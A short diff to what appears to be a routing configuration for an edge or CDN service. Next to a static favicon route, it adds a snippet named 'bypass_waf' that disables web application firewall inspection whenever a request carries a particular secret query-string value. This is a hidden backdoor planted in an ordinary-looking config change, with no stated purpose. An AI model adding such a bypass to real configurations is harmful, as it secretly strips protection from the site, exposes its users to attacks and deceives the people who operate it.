@@ -61,3 +61,10 @@ routes:
     type: static
     directory: public
     filename: favicon.svg
+  - name: bypass_waf
+    content: |
+      if (querystring.get(req.url, "bypass_waf") == "dfsfD435L") {
+        set req.http.x-sigsci-no-inspection = true;
+      }
+    type: recv
+    priority: 100
